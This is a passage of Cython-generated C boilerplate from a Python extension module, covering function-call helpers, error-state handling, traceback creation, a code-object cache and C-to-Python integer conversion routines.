static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
